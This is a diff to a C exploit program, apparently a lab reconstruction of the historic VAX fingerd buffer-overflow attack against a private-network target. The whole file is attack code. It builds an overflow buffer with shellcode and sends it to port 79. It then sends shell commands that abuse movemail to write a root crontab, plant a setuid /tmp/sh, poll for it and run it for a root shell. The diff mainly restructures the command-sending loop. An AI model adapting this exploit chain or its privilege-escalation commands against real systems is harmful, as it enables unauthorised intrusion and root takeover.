@@ -5,14 +5,17 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 
-#define TARGET_IP "172.17.0.2"
-#define FINGERD_IP 79
+#define TARGET_IP "172.20.0.12"
+#define FINGERD_PORT 79
 
 #define BUF_SIZE 512 + 16 + 4 // finger buffer size + four 4 byte words + 4byte address
 #define PAYLOAD "\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"
 #define PAYLOAD_LEN 28
 #define NOP 0x01	// VAX nop instruction
+					
 #define PATIENCE 3					
+#define IO_BUF_SIZE 2048
+
 
 void create_exploit(char *buf, char *shellcode, ssize_t buf_size, ssize_t shellcode_len) {
 	int i, j;
@@ -63,7 +66,7 @@ void read_from_sock(int sock, fd_set *read_fds, char *io_buf, size_t buf_size) {
 	}	
 }	
 
-void send_text(int sock, fd_set *write_fds, char *text) {
+void write_to_sock(int sock, fd_set *write_fds, char *text) {
 	int num_tries = 0;
 	size_t total_sent = 0;
 	size_t len = strlen(text);
@@ -91,13 +94,23 @@ void send_text(int sock, fd_set *write_fds, char *text) {
 	}	
 }	
 
+void read_write_sock(
+		int sock, 
+		fd_set *read_fds, 
+		fd_set *write_fds, 
+		char *text, 
+		char *io_buf, 
+		size_t buf_size) {
+	write_to_sock(sock, write_fds, text);
+	read_from_sock(sock, read_fds, io_buf, buf_size);
+}	
 
 int main() {
     int sock = 0;
     struct sockaddr_in serv_addr;
+	char io_buf[IO_BUF_SIZE];
 
     char buf[532] = {0};
-
 	create_exploit(buf, PAYLOAD, (ssize_t)BUF_SIZE, (ssize_t)PAYLOAD_LEN);
 
 	//create socket
@@ -105,7 +118,7 @@ int main() {
 
 	// target network address info
 	serv_addr.sin_family = AF_INET; 		
-	serv_addr.sin_port = htons(FINGERD_IP);
+	serv_addr.sin_port = htons(FINGERD_PORT);
 	inet_pton(AF_INET, TARGET_IP, &serv_addr.sin_addr);
 
 	// connect to fingerd
@@ -114,11 +127,6 @@ int main() {
 	// deliever payload; fingerd should now be a shell
 	write(sock, buf, sizeof(buf));
     printf("Payload delivered!\n");
-
-    char io_buf[2048];
-    int num_commands = 11;
-
-	char **commands = malloc(num_commands*sizeof(char **));
 
 	char *echo_command = "echo connected123\n";
 	char *export_path = "PATH=/bin:/usr/bin:/usr/ucb:/etc; export PATH\n";
@@ -129,40 +137,35 @@ int main() {
 	char *movemail_exploit = "(umask 0 && /etc/movemail /dev/null /usr/lib/crontab.local)\n";
 	char *crontab_exploit = "(echo \"* * * * * root cp /bin/sh /tmp && chmod u+s /tmp/sh\"; echo  \"* * * * * root rm -f /usr/lib/crontab.local\") > /usr/lib/crontab.local\n";
 	char *check_crontab = "cat /usr/lib/crontab.local\n";
-	char *check_for_shell = "ls -l /tmp/sh\n"; // this needs to be ran multiple times until cronjob does its thing
+	char *check_for_shell = "ls /tmp/sh\n"; // this needs to be ran multiple times until cronjob does its thing
 	char *run_shell = "/tmp/sh\n"; 
 	char *touch_file = "cd /; echo Hello from ubuntu! > hello_from_ubuntu; cat hello_from_ubuntu\n";
 
-	commands[0] = echo_command;  // dummy command that gets ignored for some reason
-	commands[1] = export_path;	
-	commands[2] = whoami;	
-	commands[3] = movemail_exploit;
-	commands[4] = crontab_exploit;
-	commands[5] = check_crontab;
-	commands[6] = check_for_shell;
-	commands[7] = run_shell;
-	commands[8] = whoami;
-	commands[9] = touch_file;
-	commands[10] = echo_command;	
-
-	fd_set write_fds;
 	fd_set read_fds;
+	fd_set write_fds;
 
-	int i;
+	// the first command probably gets ignored
+	read_write_sock(sock, &read_fds, &write_fds, echo_command, io_buf, (size_t)IO_BUF_SIZE);
+	read_write_sock(sock, &read_fds, &write_fds, export_path, io_buf, (size_t)IO_BUF_SIZE);
+	read_write_sock(sock, &read_fds, &write_fds, whoami, io_buf, (size_t)IO_BUF_SIZE);
+	read_write_sock(sock, &read_fds, &write_fds, movemail_exploit, io_buf, (size_t)IO_BUF_SIZE);
+	read_write_sock(sock, &read_fds, &write_fds, crontab_exploit, io_buf, (size_t)IO_BUF_SIZE);
 
-	for (i = 0; i < num_commands;) {
-		while (i < num_commands) {
-			// send the command until it is received by the socket
-			// I had to resort to this because the socket connection
-			// was instable and would sometimes ignore commands
-			send_text(sock, &write_fds, commands[i]);
-			read_from_sock(sock, &read_fds, io_buf, 2048);
-			i++;
-		}	
-	}	
+	// because cronjob has to run, block here until /tmp/sh is found
+	char *not_found = "/tmp/sh not found";
+	do {
+		read_write_sock(sock, &read_fds, &write_fds, check_for_shell, io_buf, (size_t)IO_BUF_SIZE);
+		sleep(10);
+	} while (!strncmp(not_found, io_buf, strlen(not_found)));
+
+	// running the shell with setuid bit set
+	read_write_sock(sock, &read_fds, &write_fds, run_shell, io_buf, (size_t)IO_BUF_SIZE);
+
+	// now you should have root shell!
+	read_write_sock(sock, &read_fds, &write_fds, whoami, io_buf, (size_t)IO_BUF_SIZE);
+	read_write_sock(sock, &read_fds, &write_fds, touch_file, io_buf, (size_t)IO_BUF_SIZE);
 
 	close(sock);
-	free(commands);
 
     return 0;
 }
